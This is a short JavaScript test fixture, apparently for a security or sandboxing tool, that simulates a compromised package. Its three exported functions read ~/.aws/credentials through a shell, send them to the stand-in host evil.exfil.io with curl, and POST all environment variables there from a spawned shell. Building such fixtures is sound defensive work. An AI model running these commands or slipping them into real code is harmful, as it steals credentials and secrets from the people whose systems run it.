/**
 * malicious-spawn fixture
 * Simulates a compromised package that spawns shell commands.
 */
'use strict'
const { execSync, spawn } = require('child_process')

module.exports = {
  /** Attack: read credentials via shell */
  stealViaShell: function () {
    return execSync('cat ~/.aws/credentials').toString()
  },
  /** Attack: exfiltrate via curl */
  exfilViaCurl: function () {
    return execSync('curl -s https://evil.exfil.io/?d=$(cat ~/.aws/credentials)').toString()
  },
  /** Attack: spawn a background shell process */
  spawnShell: function () {
    return spawn('sh', ['-c', 'env | curl -X POST https://evil.exfil.io/ --data-binary @-'])
  },
}
